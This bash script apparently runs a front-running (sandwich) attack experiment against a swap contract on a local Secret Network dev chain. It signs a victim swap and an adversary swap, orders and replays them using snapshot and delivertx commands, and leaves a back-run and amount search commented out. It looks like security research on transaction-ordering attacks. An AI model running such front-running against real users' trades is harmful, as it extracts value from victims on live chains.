set -x
set -e

VICTIM='secret1fc3fzy78ttp0lwuujw7e52rhspxn8uj52zfyne'
ADV='secret1ap26qrlp8mcq2pg6r47w43l0y8zkqm8a450s03'
ADMIN='secret1ajz54hz8azwuy34qwy9fkjnfcrvf0dzswy0lqq'
UNIQUE_LABEL=$(date '+%Y-%m-%d-%H:%M:%S')
PASSPHRASE=`cat passphrase.txt`
CHAIN_ID='secretdev-1'
SECRETD=./secretd

sleep_time=3

generate_and_sign_tx() {
  $SECRETD tx compute execute $CONTRACT_ADDRESS --generate-only "{\"swap\":{\"token_type\":\"$1\",\"offer_amt\":$2,\"expected_return_amt\":$3,\"receiver\":\"$4\"}}" --from $4 --enclave-key io-master-cert.der --code-hash $CODE_HASH --label $UNIQUE_LABEL -y --broadcast-mode sync > tx_$5.json
  echo $PASSPHRASE | $SECRETD tx sign tx_$5.json --chain-id $CHAIN_ID --from $4 --keyring-backend file -y > tx_$5_sign.json
}

deliver_tx() {
  tx=$(echo $PASSPHRASE | $SECRETD tx compute delivertx tx_$1_sign.json --from $ADMIN --keyring-backend file -y)
#  echo $tx
  sleep $sleep_time
#  tx_hash=$(echo $tx | jq -r .txhash )
#  echo $tx_hash
  seq=$(cat tx_$1_sign.json | jq -r .auth_info.signer_infos[0].sequence)
  echo $seq
  tx_result_code=$($SECRETD q tx --type=acc_seq $2/$seq | jq .code)
  echo $tx_result_code
}

execute_tx() {
  echo $PASSPHRASE | $SECRETD tx compute execute $CONTRACT_ADDRESS "{\"swap\":{\"token_type\":\"$1\",\"offer_amt\":$2,\"expected_return_amt\":$3,\"receiver\":\"$4\"}}"  --from $4 --keyring-backend file -y
  sleep $sleep_time
}

set_snapshot() {
    echo $PASSPHRASE | $SECRETD tx compute snapshot --from $ADMIN --keyring-backend file "snapshot$1" -y --broadcast-mode sync > /dev/null
    sleep $sleep_time
}

reset_snapshot() {
    echo $PASSPHRASE | $SECRETD tx compute snapshot --from $ADMIN --keyring-backend file "" -y --broadcast-mode sync > /dev/null
    sleep $sleep_time
}

reset_snapshot
./node_modules/.bin/jest -t Deploy

CONTRACT_ADDRESS=`cat contractAddress.txt`
CODE_HASH=`cat codeHash.txt`

# make victim tx
generate_and_sign_tx token_a 10 20 $VICTIM victim

# make front-run tx
#generate_and_sign_tx token_a 1 0 $ADV adv
generate_and_sign_tx token_a 100 0 $ADV adv


cnt=0
set_snapshot 1

deliver_tx adv $ADV
./node_modules/.bin/jest -t QuerySwap
deliver_tx victim $VICTIM
./node_modules/.bin/jest -t QuerySwap

## make back-run tx
#
## broadcast all 3 txs
#set_snapshot 'snapshot2'
#deliver_tx tx_victim_sign.json
#
#sleep 10
#
#./node_modules/.bin/jest -t QuerySwap

#lo=1
#hi=1000
#target=101
#while [ $(expr $hi - $lo) -ne 1 ]; do
#  mid=$(expr '(' $hi + $lo ')' / 2)
#
#  if [ $mid -le $target ]; then lo=$mid; else hi=$mid; fi
#done
#echo "$lo"